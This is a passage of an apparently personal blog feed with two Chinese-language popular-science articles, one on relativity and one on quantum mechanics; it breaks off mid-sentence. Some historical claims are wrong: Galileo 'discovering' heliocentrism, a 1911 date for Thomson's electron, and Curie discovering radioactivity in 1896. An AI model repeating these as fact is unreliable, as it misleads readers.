        <content type="html"><![CDATA[<h2 id="相对论的简单信念"><a href="#相对论的简单信念" class="headerlink" title="相对论的简单信念"></a>相对论的简单信念</h2><p>首先我们来讲一讲现代物理学的开始。<br>故事要从伽利略发现日心说开始，那时候的人都相信所有的星星都是绕着地球做运动的。但是伽利略看破了红尘，他明白了地球和其他行星都是绕着太阳做运动。而且并没有什么精灵在推着行星做运动，只需要太阳施加一个吸引力就可以。<br>第二个人是牛顿。<br>牛顿的第一定律描述了，在没有外力的作用下，物体会保持静止或者匀速直线运动。 匀速直线运动和静止一样无需外力。<br>牛顿的第二定律描述了，力会改变物体的运动方式。 请注意，这里说的是，力，是<strong>改变</strong>运动的原因。而不是力是运动的原因。<br>牛顿看破了红尘，在他的眼里，运动和静止是一回事。</p><p>第三个人是爱因斯坦。<br>看到了我们是相对于不同坐标系下来讨论这些问题的，这火车上，你射箭。相对于火车这个坐标系，你看到的是射箭的速度。 而相对于地面这个坐标系，那射箭的速度就是火车的速度加上射箭的速度。<br>可能有人会说，这不就是哲学上的参考不同的坐标系嘛，我们哲学家喝茶的功夫早就知道了。 但是爱因斯坦发现了让哲学家喝多少茶都想不到的事情。<br>当你在火车上打手电筒，手电筒的光的速度会不会是相对于地面的坐标系是光速加上火车的速度呢？<br>答案是不会，无论你从哪里去观察，光速都是一定的。天上和地下是一样的，我们这里和外星人那里也是一样的。<br>这是爱因斯坦的洞见，也是相对论和基础。</p><h2 id="电磁场英雄壮举"><a href="#电磁场英雄壮举" class="headerlink" title="电磁场英雄壮举"></a>电磁场英雄壮举</h2><p>英国物理学家詹姆斯。克拉克。麦克斯韦统一了电磁学。</p><p>当时的物理学好像有点杂乱无章，这时候麦克斯韦学众家之长，然后发现了电磁学。</p><p>首先我们弄清楚：<br>什么是电？电是电荷之间的相互作用。电子带负电，离子带正电。电子和离子产生吸引力。<br>什么是磁呢？ 磁来源于电，是电荷的运动产生了磁。 电流周围就会有磁。</p><p>什么是场？ 电荷与电荷之间没有什么<em>超距作用</em>，是电荷周会有场，电荷通过场来相互作用。<br>什么是电磁场？ 是电场和磁场相互叠加的一个总描述，叫做电磁场。</p><p>电可以生磁？变化的磁场产生电场， 反过来，变化的电场产生磁场。<strong>其中不需要电荷的存在</strong>。<br>这时，麦克斯韦想到，如果我用一个振荡器来产生周期变化的磁场，那么周期变化的磁场，就会产生电场。而周期变化的电场又会产生新的磁场，这么这样就可以一直传播下去。这就是<strong>电磁波</strong>。</p><p>电和磁的有规律的相互转化，产生了电磁波。<br>根据测量，电磁波的传播速度和光速一致。<br>麦克斯韦宣布，<strong>光其实就是电磁波</strong>。</p><blockquote><p>这是物理学家再一次看破了红尘。天上的东西和地上是一回事，匀速直线运动和静止是一回事，电和磁是一回事，而现在麦克斯韦说，光跟电磁场，其实也是一回事。</p></blockquote><p>但是，这里有一个问题，这个电磁波是根据什么坐标系来观测的？ 是发送电磁波的仪器吗？ 但是天文学家发现，双星系统，其中一个靠近我们，那另一个就是远离我们的情况下，观测到的两个行星的电磁波的速度其实是一样的。</p><p>当时的人们认为空间中存在<em>以太</em>这种物质来传播，但是被证明不存在。</p><p>此时爱因斯坦登场</p><blockquote><p>一般情况下师长们都告诉你要适应世界。爱因斯坦不是来适应世界的，他是来改变世界的。</p></blockquote><h2 id="刺激1905"><a href="#刺激1905" class="headerlink" title="刺激1905"></a>刺激1905</h2><p>这一年称为奇迹年，爱因斯坦发表了数篇论文，引发了人类关于物理世界的基本概念 – 时间、空间、能量、光和物质 – 的三大革命。</p><p>首先，爱因斯坦断言：</p><blockquote><p><strong>一切静止或者匀速直线运动的坐标系下，物理定律都一样。</strong></p></blockquote><p>这表明了不只有力在坐标系下都一样，而是所有物理定律 – 包括电动力学 – 都一样。</p><p>并且断言，<strong>光速无论是什么坐标系下，都一样。</strong><br>$$ c = 299,792,458 m/s $$</p><p>你所感觉的光速在火车上还是地上的速度问题，并不是光速的问题，而是你的时空观有问题。</p><p>现在假设你在火车上向天花板照一束光，是向下面这样的。</p><p><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/relativity_1.jpg" alt="Alt text| center | 200*0"></p><p>而在地面上的人看到的结果是这样的：</p><p><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/relativity_2.jpg" alt="Alt text | center | 500*0"></p><p>可以看出来，在地面坐标系种，光走的是斜线。<br>距离D比L要长，光速不变，所以时间更长。</p><p>结论是，在火车上你感觉到的时间要比在外面的时间短。<br><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/relativity_3.png" alt="Alt text | left | 300*0"></p><p>$ v \uparrow \rightarrow \Delta t’ \uparrow$</p><p>速度越快， $\Delta t’ \uparrow $ 就越大在外面感受到的时间就越快。相对的，$\Delta t \downarrow$ 就越小，里面的人感受到的时间就越慢。<br>所以在地面坐标系下看，地上的人感受到的时间没有变化，而火车里的人的时间变慢了。<strong>是时间本身变慢了</strong></p><h2 id="穿越到未来"><a href="#穿越到未来" class="headerlink" title="穿越到未来"></a>穿越到未来</h2><h3 id="真的可以长寿"><a href="#真的可以长寿" class="headerlink" title="真的可以长寿"></a>真的可以长寿</h3><p>相对论的核心在于处于不用的坐标系来观察。</p><p>我们可以做这样的一个实验。<br>有一个星球距离我们80光年，我们通过加速到0.8c的宇宙飞船飞到那个星球。<br>在地面上的人看，这段时间需要花上100年。 而飞船上的宇航员自己则会感觉到只过去了60年。坐标系下的时间会发生<strong>时间膨胀</strong>。<br>要用这个方法来验证显然不太现实。但是物理学家想到了另外一种实验方法。</p><p>有一种叫做$\mu$子的基本粒子，他有一基本特性就是特别特别短命。 半衰期是2.2微秒。也就是说给你一堆$\mu$子，他们会在2.2微秒后只剩下一半了，然后再过2.2微秒又有一半木有了。<br>而这个实验就是将一堆$\mu$子从山顶上加速到0.9994c的光速，然后丢下来。如果到地面上的$\mu$子数量大于在静止坐标系下得到的数量，那么相对论就是正确的。</p><p>实验结果完美的符合了相对论的预测，平均寿命被延长了29.3倍！</p><p>相对论不但正确，而且非常精确。</p><h3 id="双生子佯谬"><a href="#双生子佯谬" class="headerlink" title="双生子佯谬"></a>双生子佯谬</h3><p>问题是这样的，你妹妹在地球上，而你坐上了宇宙飞船。<br>在妹妹的坐标系中，你处于高速运动中，你的时间变慢了。<br>而在你的坐标系中，妹妹同样也是高速离开，那妹妹的时间也变慢了。</p><p class='qst'>那你飞一圈回来后，是你比妹妹年轻还是妹妹比你年轻呢？<p class='asr'>这个问题的关键在于你的坐标系和你妹妹的坐标系并不是等价的。你所处于的运动过程，要有加速，匀速直线减速掉头再加速最后减速的过程。并不全都是匀速直线运动。计算的过程比较复杂，但是结论是真实的。并且你会比你妹妹年轻一些。<h3 id="时空是相对的"><a href="#时空是相对的" class="headerlink" title="时空是相对的"></a>时空是相对的</h3><p>和<strong>时间膨胀</strong>对应的是<strong>长度收缩</strong></p><p>当宇航员用20年的时间完成了本来需要30年才能完成的路程。那么相对于宇航员来看。这段路程实际上是变短了。</p><p>我们所处的坐标系下，其实和外星人所处的坐标系。在没有联系的情况下是完全两个独立的时空。你过你的，我过我的。但是一旦建立起了联系，那么就需要进行相对的转换了。</p><h2 id="“现在”是一个幻觉"><a href="#“现在”是一个幻觉" class="headerlink" title="“现在”是一个幻觉"></a>“现在”是一个幻觉</h2><h3 id="同时不同时"><a href="#同时不同时" class="headerlink" title="同时不同时"></a>同时不同时</h3><p>首先我们想象一个运动火车中中间的一盏灯，发出了一束光。<br>当你站在火车中的时候，这两束光是同时到达了火车头和火车尾部。<br><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/relativity_5.jpg" alt="Alt text | center | 400*0"></p><p>而当你站在外面观察这盏灯发出来的光线。火车从左到右，那么这两束光线是先到达了车尾，后到达了车头。<br><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/relativity_4.jpg" alt="Alt text | center | 400*0"></p><p>两个情况是不相同的。 同时还是不同时完全取决于你的坐标系。<br><strong>抛开坐标系谈相关性都是空谈。</strong></p><h3 id="光锥中的才是命运"><a href="#光锥中的才是命运" class="headerlink" title="光锥中的才是命运"></a>光锥中的才是命运</h3><p>事实上，我们身边发生的事情都不是同时发生的。<br><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/relativity_6.jpg" alt="Alt text | center | 400*0"></p><p>这是时间的光锥。只有光锥内的事件才是会受到影响的事件。<br>过去的光锥中的事件可以影响观察者，而观察者也可以影响未来光锥中的事件。<br>但是光锥外的事件是无法影响观察这，并且观察者也无法影响光锥外的事件。</p><h2 id="质量就是能量"><a href="#质量就是能量" class="headerlink" title="质量就是能量"></a>质量就是能量</h2><h3 id="速度叠加"><a href="#速度叠加" class="headerlink" title="速度叠加"></a>速度叠加</h3><p>我们想象一下这样的场景，在火车上射出一支箭。火车的速度是$200m/s$，射出去的箭是$100m/s$。那么在外面的人来看。这个箭的速度应该是 $200 + 100 = 300m/s$ 。</p><p>那么是不是可以类推，在$0.8c$的飞船上，射出$0.5c$的火箭，那么就是 $0.8c + 0.5c = 1.3c$ 而超光速了呢？</p><p>爱因斯坦给出的答案是NO。因为<em>必须考虑到时间膨胀和长度收缩的效应。</em><br>其中$v$是飞船相对于地面的速度，$u’$是火箭相对于飞船的速度，$u$是火箭相对于地面的速度。<br>火箭相对于地面的速度并不是简单的$v + u’$ 。通过以下公式</p><p><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/960631862.jpg" alt="Alt text | center | 200*0"></p><p>通过公式的出来的速度为$0.928c$，是没有超过光速的。<br><strong>如果$u’$ 和 $v$ 都远小于光速$c$的时候，那么这个公式就可以近似为$u = u’ + v$ 和我们生活定律一样。</strong></p><h3 id="质量变重"><a href="#质量变重" class="headerlink" title="质量变重"></a>质量变重</h3><p>现在来看另外一个例子</p><p>你在飞船上，我在地面上。飞船相对于地面有一个很高的速度。但是你坐在飞船里，飞船相对于你的速度为0。<br>你可以让飞船加速，你会产生推背感。并且一直保持有推背感，那么你是不是会觉得你速度越来越快，都快到达光速了呢。<br>但是在地面的我看来，你就想是个油腻的中年人，越走越慢。</p><p>就等效于你的质量越来越重，所以加速度越来越小。</p><ul><li>这就是相对论的另一个效应：<strong>高速运动物体的质量会变重</strong>。质量变重的形式和时间膨胀一样</li></ul><p><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/52857151.jpg" alt="@m0是物体静止时候的质量 | center | 200*0"></p><p>可以从公式中看出来，当速度$v$越接近$c$，分母就越小。所得到的$m$就越大。</p><blockquote><p>相对论的几个效应可以用类比联想的方式记忆： <strong>运动会让你<em>更年轻</em>（时间膨胀）、<em>变瘦</em>（长度收缩），和<em>变结实</em>（质量变重）</strong> </p></blockquote><ul><li><strong>一切有质量的物体都不可能达到光速</strong></li><li>只有光子没有质量所以达到了光速。它不会变老，要么运动，要么消失。</li></ul><h3 id="E-mc-2"><a href="#E-mc-2" class="headerlink" title="$E = mc^2$"></a>$E = mc^2$</h3><p>那么现在又有一个问题了，这些增加出来的质量，是多在了哪里？</p><ul><li>爱因斯坦产生了这样的一个洞见： <strong>$mc^2$代表了一个物体的<em>全部能量</em> – 哪怕他静止不动，也有能量。</strong><br>这就是“质能方程”。</li><li><strong>物质和能量是一回事。</strong></li></ul><p>这就是狭义相对论</p><h2 id="广义相对论"><a href="#广义相对论" class="headerlink" title="广义相对论"></a>广义相对论</h2><h3 id="广义相对原理"><a href="#广义相对原理" class="headerlink" title="广义相对原理"></a>广义相对原理</h3><ul><li><strong>在所有坐标系下，物理定律都是一样的。</strong></li></ul><h3 id="加速度和引力"><a href="#加速度和引力" class="headerlink" title="加速度和引力"></a>加速度和引力</h3><p>我们可以想象一个这样的场景。<br>你处于一个一直做加速运动的火箭里。 你会感觉到一个力，这个力向下。此时你抛一个小球，这个小球也会朝着地面的方向掉落。那么这个实验和在地球上抛小球通过引力落回地面上有区别吗？</p><p><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/1225873056.jpg" alt="Alt text | center | 300*0"></p><p>爱因斯坦说，<strong>我在火箭内部做实验，观测不到任何的区别</strong></p><h3 id="自由落体和匀速直线运动"><a href="#自由落体和匀速直线运动" class="headerlink" title="自由落体和匀速直线运动"></a>自由落体和匀速直线运动</h3><p class='qst'>自由落体是一个加速运动，但是为什么爱因斯坦说它跟匀速直线运动没有区别呢？<p class='asr'>**因为自由落体状态下物体的加速度都是一样的。**<p>我们知道，在地球上加速度G是一个恒定的数值$9.8m/s$<br>只有这样，两个质量不同的小球才会在同时下落的情况下同时到达地面。</p><ul><li><strong>在任何局部实验中，引力和加速度运动无法区分。</strong></li></ul><h3 id="广义相对论的结论"><a href="#广义相对论的结论" class="headerlink" title="广义相对论的结论"></a>广义相对论的结论</h3><ul><li>一个有质量的物质，会弯曲它周围的时空。这叫<em>“物质告诉时空如何弯曲”</em>。</li><li>在不受外力的情况下，一个物体总是沿着时空中的测地线运动。这叫<em>“时空告诉物质如何运动”</em>。 </li></ul><p>这里面不需要引力。</p>]]></content>
      
      
      <categories>
          
          <category> 科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 物理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>量子力学</title>
      <link href="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/"/>
      <url>/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>量子力学是描述微观粒子的物质行为的物理学理论，量子力学是我们理解除了万有引力之外的所有基本力的一个基础。这些基本力包括了电磁相互作用、强相互作用和弱相互作用。</p><p>量子力学主要是用来描述粒子在微观尺度下的行为，所有的粒子现象无法用经典力学精确描述。</p><p>为什么要了解一下量子力学？<br>我想，去了解一下这个世界上最聪明的那群人在思考些什么，这个事本身就非常有趣。</p><h2 id="量子力学的前夜"><a href="#量子力学的前夜" class="headerlink" title="量子力学的前夜"></a>量子力学的前夜</h2><p>在经典力学完备的情况下，19世纪末人们普遍认为经典物理已经非常完备了，只需要再解决两个小小的乌云就可以将物理学大厦封顶。后面的物理学家再修修补补一下就可以了。</p><p>但是，这两个小小的乌云却有点怪。</p><p>这两个乌云都与光有关，第一个是为什么光速再任何方向上都保持不变，这个直接导致了爱因斯坦发现了狭义相对论。<br>第二个是关于黑体辐射。</p><h3 id="紫外灾难"><a href="#紫外灾难" class="headerlink" title="紫外灾难"></a>紫外灾难</h3><p>紫外灾难是说，经典物理学解释黑体辐射问题与实验结果不符的历史事件。</p><p>黑体辐射问题，问的是黑体辐射强度与能量之间的关系。</p><blockquote><p>所谓黑体，就是物体不反射光，只会自身发光，比如太阳，烧红的烙铁</p></blockquote><p>实验物理学家给出了黑体辐射光频率的的分布曲线，但是这个曲线为什么是这样的，理论物理学家通过经典物理学无法解释。</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/20210116123203.jpg"></p><p>这个时候，普朗克出来了，他通过纯数学凑数的办法，凑出了一个公式，而这个公式完美符合曲线。</p><p>但是这个公式怎么解释呢，最后发现，只要满足一个物理假设，就可以推导出这个公式，那就是要求每一个电子震动产生的无线电波的的能量不是连续的，而是<strong>一份一份</strong>的 。</p><p>$E = nhf$ 这里 n = 1, 2, 3 …<br>其中$f$是频率，$h$是常数，现在称为<strong>普朗克常数</strong>， h=6.626 * 10 ^(-34) 焦耳*秒。</p><p>这样就避免了紫外灾难。</p><p>但是普朗克并不清楚这<strong>一份一份</strong>意味着什么。</p><h3 id="光电效应"><a href="#光电效应" class="headerlink" title="光电效应"></a>光电效应</h3><p>光电效应是说光打到金属板上会由电子跑出来的现象。电子跑出来多少只与光是什么颜色的（频率）有关，而与这个光的强度无关。这个实验与经典力学是不符的，因为经典力学认为强度积攒多了也可以跑出电子来。</p><p>这时候爱因斯坦出来了，说这是因为光是一份一份的，普朗克不是说了么，光的一份能量是$E=hf$，频率越高能量越大，所以高频率的光的一份能量才足够大，才能打动电子。</p><p><em>可以打一个比方，拿石头去砸墙，光的频率就是石头的大小，你用大石头去砸墙就会有石膏掉落，但是用小石子却不会掉落。</em></p><p>这里的关键是爱因斯坦将普朗克的假说来了个思维跃迁，认为只要是光，能量就是一份一份的。</p><p>由紫外灾难引发了普朗克对黑体中电子受热震动的能量是一份一份的思考，然后由爱因斯坦提出了，<strong>光量子</strong>。</p><h3 id="什么是量子"><a href="#什么是量子" class="headerlink" title="什么是量子"></a>什么是量子</h3><p>普朗克与爱因斯坦的解题思路，叫做<strong>量子化</strong>，那么什么是量子呢。</p><p>比如高清电视，离得远了看非常丝滑，但是贴着看会有一个一个的晶体管，分辨率是有极限的，画面不是连续的，这个就是量子化。</p><p>那么为什么我们生活中感受不到世界是量子的呢，因为普朗克参数非常小，感觉不到。也就是分辨率太高了。</p><h2 id="经典量子力学"><a href="#经典量子力学" class="headerlink" title="经典量子力学"></a>经典量子力学</h2><h3 id="原子的内部结构"><a href="#原子的内部结构" class="headerlink" title="原子的内部结构"></a>原子的内部结构</h3><p>《庄子》中有句话：“一尺之棰，日取其半，万世不竭”，这句话在物理上是错的。</p><p>我们知道，分子是由原子组成的，原子是由原子核和电子组成的，原子核是由质子和中子组成的，质子和中子又是由夸克组成的。但是夸克是由什么组成的呢？ 现代物理学的标准模型认为，夸克和电子为<strong>基本粒子</strong>，是不可再分的。</p><p>就比如一本书，你可以分为章节，段落，句子，词，字，但是字就不可再分了，因为他们是抽象概念，无需再分。</p><p>而物质怎么分，正是量子力学的开始。</p><p>1896年，居里夫人发现铀原子能执法的往外发射某种射线，这个现象被称为”发射性“，并确定这个反应不是原子与原子之间发生的，而是由原子自身发出的，由此推断<strong>原子内部还有结构</strong></p><h3 id="波尔的原子模型"><a href="#波尔的原子模型" class="headerlink" title="波尔的原子模型"></a>波尔的原子模型</h3><p>1911年，汤姆生领导的一个研究小组发现了一种带着一个单位负电荷且质量极小的基本粒子并把它命名为电子。</p><p>卢瑟福和其学生通过金箔实验，物理学家认识到物质的内部几乎是真空的，原子核只占了原子很小的一部分。</p><blockquote><p>金箔实验：实验是用α粒子轰击各种金属箔纸，发现绝大多数α粒子的偏向很小，但少数的偏向角很大甚至大于90度。由此可以证明，一个原子大部分的体积是空的空间，这由没有被弹回的粒子充分说明。</p></blockquote><blockquote><p>这个实验推翻了约瑟夫·汤姆孙创建的汤姆孙模型 。根据这模型，原子是由电子悬浮于均匀分布的带正电物质里所组成。这个实验为建立现代原子核理论打下了坚实基础。</p></blockquote><p>卢瑟福的模型是电子围绕在原子核周围，但是现在由两个问题：</p><ol><li>电子是如何保持稳定轨道的？</li><li>原子的确会对外辐射，而不受干扰也会辐射，但是原子辐射的光谱很独特，不是连续的。</li></ol><p>接下来波尔登场。</p><p> 波尔想到了普朗克和爱因斯坦的解题思路，量子化。所以决定对电子的轨道量子化。并提出4个假设：</p><ol><li>电子平时按照特定的轨道运动，每个轨道由自己的能级，能级和“轨道量子数”成反比</li><li>电子在同一个轨道中运动时，并不向外辐射能量。</li><li>只有当电子在两个不同能级之间跃迁的时候，它才会辐射能量。</li><li>电子轨道有个角动量，角动量也要量子化。</li></ol><p>这个模型非常成功，光电效应不是说外来一个高能量的光子能把电子打飞么，需要多大的能量呢？答案是正好是那个电子所在能级的能量。</p><p>波尔还能明明白白地告诉你原子中如果有多少个电子，那么他们将如何排列，波尔等于解释了整个化学。</p><h3 id="波粒二象性"><a href="#波粒二象性" class="headerlink" title="波粒二象性"></a>波粒二象性</h3><p>什么东西即是波又是粒子，这就叫“波粒二象性”。我们仔细想想，这个东西会有什么样的行为。</p><p>如果电子是一个点，那么它如何展现”波动“的特性呢？它是不能走”之“字型路线的，因为会有急转弯，而导致加速运动，发生辐射，另外会超过光速，违反了相对论。</p><p>而如果电子是一片波动的云，那么我们为何每次都能捕捉到一个点的呢？从云到点的变化是如何发生的。</p><p>杨氏双缝实验，如果一个一个的发射电子，最后的出来的也会是干涉条纹。那么是谁与电子发生的干涉？是自己和自己吗？一个电子是如何同时通过了两个缝隙发生了自己与自己的干涉？</p><h2 id="现代量子力学的发展"><a href="#现代量子力学的发展" class="headerlink" title="现代量子力学的发展"></a>现代量子力学的发展</h2><h3 id="不确定性原理"><a href="#不确定性原理" class="headerlink" title="不确定性原理"></a>不确定性原理</h3><blockquote><p>海森堡解释了不确定性原理。当时的他并没有意识到，这个原理即代表了物理学的探索边界，又是量子世界最核心的规则。</p></blockquote><p>海森堡说，电子有时候表现的像粒子，有时候又表现的像个波，那么它到底是什么，这个我们无法想象，也没有必要想象。</p><p>应该关心的是<strong>可测量</strong>的东西，电子的轨道其实是不可测量的。</p><p>如果想要得到电子的路线图，那么需要同时知道电子的位置和速度（也就是动量$p=mv$），但是，海森堡说，这个是不可能的，你无法同时精确的知道电子的位置和动量。</p><p><strong>位置的测量误差和动量的测量误差是一个取舍关系，他们不可能都很小</strong></p><p>这个解释很有道理，但是还不够彻底，还不够革命。</p><p>海森堡说的是测不准，说的是你的测量手段本身相悖。因为想测量一个东西就不得不干扰这个东西。但是并不是这样的。</p><p>量子力学正在的观点不是<strong>测不准</strong>，而是<strong>不确定</strong>。不是你能力的问题，而是电子的本性问题。</p><p>电子根本不能同时拥有确定的位置和动量。电子的行为有内在的不确定，永远都是模糊的。</p><p>这个原理就是<strong>海森堡不确定性原理</strong>。</p><p>下面这个图才是原子的样子。</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/95b07a231f127e8656732a1396fab30.png" alt="Alt text | center | 300*0"></p><p>电子并不是绕着原子核做圆周运动，电子没有确定的位置，它同时出现在原子核之外的各个地方，呈现出来的是的是一片”云“，其实原子核也是一片”云“。</p><p><strong>”不确定“是量子世界的本质，海森堡要求我们专注于那些能测量的东西，坦然接受测量结果的不确定性。</strong></p><p>直到今天，我们也只是知道电子的一些”性质“，但是电子到底是个什么东西，我们并不知道。</p><h3 id="薛定谔的波动方程"><a href="#薛定谔的波动方程" class="headerlink" title="薛定谔的波动方程"></a>薛定谔的波动方程</h3><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/ebb011724d8c83747d5703f4412b942.png" alt="Alt text"></p><p>这个方程描述了<strong>波函数</strong> $ψ(x,t)$ 在不同位置和时间的变化。</p><p>有了薛定谔的方程，我们就可以精确的知道波函数在任何时间位置的数值。</p><p>但是波函数到底指的是什么，这时候的薛定谔并不清楚。后来德国物理学家马克斯·玻恩提出了解释</p><blockquote><p>波函数绝对值的平方，等于粒子出现在那个时间和那个地点的概率</p></blockquote><p>没有被观测的粒子就好像是一片与，它既可以在这里也可以在那里，但是它出现的概率是不一样的，如果是0就绝对不可能出现。</p><p>但是这里有两个问题：</p><ol><li>玻恩解释说明量子力学是一个关于概率的科学。</li><li>波函数是一个十分怪异的存在。</li></ol><p>为什么怪异？ 当电子打到屏幕上，位置固定下来以后，波函数瞬间就在其他位置都变成了0。这叫<strong>波函数的坍缩</strong>。电子从一个”波“坍缩成了”粒子“。那么这个过程中发生了什么呢？</p><p>本来是全局的，坍缩后突然变成了一个点。这个过程是不连续的，是不可逆的。</p><h3 id="量子隧穿"><a href="#量子隧穿" class="headerlink" title="量子隧穿"></a>量子隧穿</h3><p>在经典力学中，小球是不可能凭空穿过一面墙的。但是在微观的量子世界中，穿过墙壁只是一个概率问题。</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/8588f9399d49ecaebaa74b9af313276.png" alt="Alt text | center"></p><p>图中的E是粒子的能量，而V是墙的势能。 墙的势能V比粒子的能量E高，所以墙对粒子造成了限制。</p><p>波函数在经过墙迅速衰减，虽然波动幅度小了，但并不是一条直线，所以根据玻恩解释，粒子是可以到达墙后面的。</p><p>能量小的粒子穿过了势能大的物质，就叫做<strong>量子隧穿</strong>。</p><p>量子隧穿在很多方面都有应用和体现：</p><ol><li><p>质子和中子的动能比结合力的势能小，但是他们能跑出来，这就造成了发射性原子核衰变。这是量子隧穿的功劳。</p></li><li><p>核聚变要求原子核与原子核克服库仑位势垒，单独的热能无法达到以促成核聚变。但是量子隧穿能够突破，才有了核聚变，才有了太阳。</p></li><li><p>DNA的自发性突变，质子隧穿透过了DNA的碱基对的氢键位势垒，使得DNA复制中发生突变，这才有了丰富多样的世界。</p></li></ol><h3 id="狄拉克引领的量子电动力学"><a href="#狄拉克引领的量子电动力学" class="headerlink" title="狄拉克引领的量子电动力学"></a>狄拉克引领的量子电动力学</h3><p>保罗·狄拉克融合了狭义相对论的波动方程叫做<strong>狄拉克方程</strong>，这个方程解出了两个新东西：</p><ol><li>有正电子， 这个是人类发现的第一个反物质</li><li><strong>自旋</strong></li></ol><p class='quest'>什么是自旋？<p class='answer'>电子绕着原子核做旋转之外，自身还有一个旋转，这个自身旋转的角动量是“量子化”的，也就是说它的角动量只有“1/2”和“-1/2”两个值，我们把电子的自身旋转称为自旋。<p>但是，请注意，这里的自旋是无法形象的理解的。电子的自旋为1/2，那么把电子想象成小球的话，这个小球必须转两圈才能回到原来的样子。并且根据自旋角动量的计算，这个小球的表面速度已经超过了光速，这个不合理。</p><p>另外需要注意的是，到目前为止，物理学家对电子的理解只是知道了它的各种内在属性，但是电子到底是什么我们并不清楚。</p><p>所以，<strong>自旋是电子的一个内在属性，是一个具有角动量特点的性质</strong></p><p>将电子自旋的状态标示，可以写成<br><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/3ccc9de8992d16efc2275924a9c7259.png" alt="Alt text| center | 300*0"></p><p>狄拉克发明的“半个括号” （”**|&gt;<strong>“）表示了一个量子态，所以这个公式说的是电子的量子态是自旋方向上的两个正负量子态之和。这个就是“</strong>量子叠加态**”</p><p>电子的自旋描述的是一个方向上的电子的自旋的量子态，在另外一个方向上，有着另一个，完全不相干的自旋量子态。</p><p>比如说我们是在x方向上观察电子的量子态，可以得到<img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/11af993e137cc9196dd1475e562ddc9.png" alt="Alt text | 200*0"><br>同样我们观测z方向上的电子的自旋量子态，可以得到<img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/c34780b706571ea14ca0b34a798c5cd.png" alt="Alt text | 200*0"><br>这两个方向上的量子叠加态是互不相干的。</p><ul><li>现在我们更进一步：</li></ul><p>在我们观察z方向正1/2自旋电子后的，继续对这个电子进行x方向的观测，那么它同样会有x方向的叠加态<img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/aa96b3e5b76f2c313615001349d9fd6.png" alt="Alt text|200*0"></p><p>更进一步，如果继续在x方向对观测到的x方向的坍缩的电子进行观测，那么它保持原来的自旋态性质不变。</p><p>他的过程是下面这样的：<br><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/aae536a7b0c30cb3717847ba22dffcf.png" alt="Alt text| center | 700*0"></p><p>这样的性质被<strong>冯·诺依曼投影公设</strong>解释：</p><ol><li>每个量子态，都可以展开成一系列基本的量子态的叠加  <img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/fa666bc9763be81afa3be6deb4b701c.png" alt="Alt text| 200*0"></li><li>一次实验观测后，系统就坍缩到其中的一个态e_i。而到底坍缩到哪个态，由系数c_i的绝对值的平方决定。</li><li>从此以后，系统就一直处于e_i态。但如果e_i态还有不确定性，系统就可以再次被观测到别的态，方法仍然使用量子态叠加展开。</li></ol><p>那么哪部分是属于量子电动力学的呢？<br>这么说吧。引力，属于广义相对论的范畴，原子核以内的属于更现代物理理论。不考虑引力，在原子核之外的所有的万事万物都归量子电动力学管</p><h3 id="泡利不相容原理"><a href="#泡利不相容原理" class="headerlink" title="泡利不相容原理"></a>泡利不相容原理</h3><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/85e27b3308331e0c1f638db77af2f2f.png" alt="Alt text | center | 500*0"></p><p>上图是电子云图，颜色的深浅代表了电子在一个地方被发现的概率。</p><p>完全确定电子的状态，需要4个“量子数”。</p><ol><li>主量子数<code>n</code>， 代表电子所处的能级，能级越高，电子出现在那里的概率越低。</li><li>角动量量子数 <code>l</code>,代表电子轨道的形状，也就是电子云的形状，l=0为球形，l越大，电子云越扁。</li><li>磁量子数<code>m</code>, 代表轨道的方向。</li><li>自旋量子数。</li></ol><p>泡利不相容原理说，<strong>一个原子的任何两个电子的是个量子数，不能完全相同。</strong></p><p>正因为有了泡利不相容原理，才能让电子不会全部集中在低能级上。大原子的势力范围才更大，才能有外层电子决定各种化学性质。世界才如此多姿多彩。</p><p>为什么电子会遵守泡利不相容原理呢？根本原因是自旋的数学。</p><p>所有的基本粒子分为两类：</p><ol><li><strong>玻色子</strong>， 它们的自旋是整数，它们是力的传播者，像胶子、介子、希格斯粒子和想象中的引力子都是玻色子。光子也是玻色子，自旋是1</li><li><strong>费米子</strong>， 